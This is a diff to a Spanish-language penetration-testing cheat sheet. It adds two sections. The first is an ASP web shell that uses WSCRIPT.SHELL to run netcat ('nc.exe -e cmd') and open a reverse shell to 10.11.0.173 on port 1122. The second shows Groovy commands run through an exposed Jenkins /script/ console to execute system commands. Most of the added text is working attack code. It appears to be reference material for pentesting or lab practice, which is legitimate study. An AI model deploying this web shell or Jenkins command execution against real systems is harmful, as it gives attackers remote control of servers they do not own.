@@ -44,6 +44,7 @@
        * [NoTCPShell](#notcpshell) 
        * [Bypass File Upload Filtering](#bypass-file-upload-filtering)
        * [XML External Entity Injection](#xml-external-entity-injection)
+       * [X-Jenkins Remote Code Execution](#x-jenkins)
      * [Pentesting Linux](#pentesting-linux)
         * [Tratamiento de la TTY](#tratamiento-de-la-tty)
         * [Monitorizado de Procesos a Tiempo Real](#process-monitoring)
@@ -1954,6 +1955,34 @@ De esta forma, el usuario que hace las consultas podría efectuar cualquiera de 
 * http://192.168.1.X/fichero.php?upload=script.php&fexec=php+script.php
 
 Para depositar archivos sobre el sistema aprovechando la variable '_fupload_', necesitaremos compartir un servidor con Python perviamente sobre el directorio cuyos recursos queramos depositar sobre el equipo remoto.
+
+#### ASP ASPX Reverse Shell
+
+Habiendo citado ya una forma de entablar una conexión TCP reversa a través de un fichero .asp/.aspx generado desde Metasploit, otra vía en caso de que la primera no funcione, es crear un archivo con dicho contenido:
+
+```bash
+<%
+Dim oS
+On Error Resume Next
+Set oS = Server.CreateObject("WSCRIPT.SHELL")
+Call oS.Run("C:\Inetpub\nc.exe -e cmd 10.11.0.173 1122",0,True)
+%>
+```
+
+Habiendo previamente subido el binario **nc.exe**, con esto conseguiremos que de ser interpretado vía web el script, se nos entable una reverse shell por el puerto 1122 vía Netcat gracias a la ejecución del binario previamente alojado.
+
+#### x-jenkins
+
+En caso de que el servicio web corra un **Jenkins**, de manera inmediata se comprobará si existe el recurso **/script/** sobre el servicio. En caso de existir, el servicio es vulnerable a ejecución remota de comandos gracias al script de consultas interactivas que podemos crear desde ahí.
+
+Para ello, deberemos definir las siguientes líneas de consulta:
+
+```bash
+cmd = "whoami"
+cmd.execute().text
+```
+
+Tras enviar la consulta, veremos el Output de la ejecución a nivel de sistema del comando proporcionado.
 
 #### Bypass File Upload Filtering
 
